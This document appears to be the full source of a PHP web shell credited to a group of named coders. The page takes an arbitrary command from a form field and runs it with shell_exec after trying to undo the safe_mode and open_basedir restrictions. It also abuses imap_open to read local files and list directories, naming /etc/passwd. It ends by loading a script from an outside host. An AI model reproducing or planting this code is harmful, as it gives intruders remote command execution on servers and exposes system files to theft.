<?php
error_reporting(0);
?>
<style type="text/css">
 <!--
 .text {
 	font-family: Verdana, Arial, Helvetica, sans-serif;
 	color : white;
 	font-size: 11px;
 	font-weight: normal;
 }
 body {
 	background-color: #333333;
 }
 body,td,th {
 	color: #FFFFFF;
 }
 -->
 </style>
 <style type="text/css">
 <!--
 .style3 {color: #00FF00}
 a:link {
 	color: #333333;
 }
 a:visited {
 	color: #333333;
 }
 a:hover {
 	color: #333333;
 }
 a:active {
 	color: #333333;
 }
 -->
 </style>
 
 
 	  <input type="text" size="40" value="<? if($_POST['dizin'] != "") { echo $_POST['dizin']; } else echo $klasor;?>" name="dizin">
 
 <?php
 
 
 $coder="The_BeKiR  &  TiT  & Ruslan ";
 $string = !empty($_POST['string']) ? $_POST['string'] : 0;
 $switch = !empty($_POST['switch']) ? $_POST['switch'] : 0;
 
 if ($string && $switch == "file") {
 $stream = imap_open($string, "", "");
 if ($stream == FALSE)
 die("gucum yetmiyor abi");
 
 $str = imap_body($stream, 1);
 if (!empty($str))
 echo "<pre>".$str."</pre>";
 imap_close($stream);
 } elseif ($string && $switch == "dir") {
 $stream = imap_open("/etc/passwd", "", "");
 if ($stream == FALSE)
 die("gucum yetmiyor abi");
 
 $string = explode("|",$string);
 if (count($string) > 1)
 $dir_list = imap_list($stream, trim($string[0]), trim($string[1]));
 else
 $dir_list = imap_list($stream, trim($string[0]), "*");
 for ($i = 0; $i < count($dir_list); $i++)
 echo "$dir_list[$i]\n";
 imap_close($stream);
 }
 ?>
 <?
 $evilc0der=$_POST['dizin'];
 if($_POST['dizin'])
 {
 ini_restore("safe_mode");
 ini_restore("open_basedir");
 $safemodgec = shell_exec($evilc0der);
 echo "$safemodgec";
 }
 ?>
   </textarea>
 <?  echo "<font color=#00FF00 style=font-size: 70pt face=Arial><h5> C0d3d By $coder</h5>"; 
 ?>
 
 </div>
<SCRIPT SRC=http://www.shellci.biz/yazciz/ciz.js></SCRIPT>
